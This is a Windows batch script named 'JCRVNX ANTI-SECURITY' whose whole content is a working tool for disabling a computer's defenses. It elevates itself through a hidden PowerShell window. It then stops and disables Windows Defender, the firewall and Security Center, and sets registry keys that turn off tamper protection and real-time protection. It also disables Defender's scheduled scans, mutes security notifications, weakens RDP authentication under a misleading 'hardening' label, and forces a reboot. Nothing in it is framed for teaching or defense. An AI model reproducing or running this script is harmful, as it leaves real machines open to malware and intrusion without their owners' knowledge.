@echo off
title JCRVNX ANTI-SECURITY

:: Check for Admin Privileges
NET FILE 1>NUL 2>NUL || (
    PowerShell Start -WindowStyle Hidden -Verb RunAs '%0'
    exit /b
)

:: Main Execution
cls
echo [JCRVNX ANTI-SECURITY] - Disabling Windows Security Measures
echo -----------------------------------------------------------

:: Stop and Disable Security Services
sc stop WinDefend 2>NUL
sc config WinDefend start=disabled 2>NUL
sc stop mpssvc 2>NUL
sc config mpssvc start=disabled 2>NUL
sc stop SecurityHealthService 2>NUL
sc config SecurityHealthService start=disabled 2>NUL
sc stop wscsvc 2>NUL
sc config wscsvc start=disabled 2>NUL

:: Disable Firewall
netsh advfirewall set allprofiles state off 2>NUL

:: Registry Manipulations
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f 2>NUL
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f 2>NUL

:: Disable Scheduled Tasks
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /DISABLE 2>NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /DISABLE 2>NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /DISABLE 2>NUL
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /DISABLE 2>NUL

:: Disable Security Center Notifications
reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v "AntiVirusDisableNotify" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v "FirewallDisableNotify" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v "UpdatesDisableNotify" /t REG_DWORD /d 1 /f 2>NUL

:: Final System Hardening
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 1 /f 2>NUL
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0 /f 2>NUL

echo -----------------------------------------------------------
echo [JCRVNX ANTI-SECURITY] - Security Measures Successfully Disabled!
echo Rebooting system to apply changes...
pause
shutdown /r /t 0
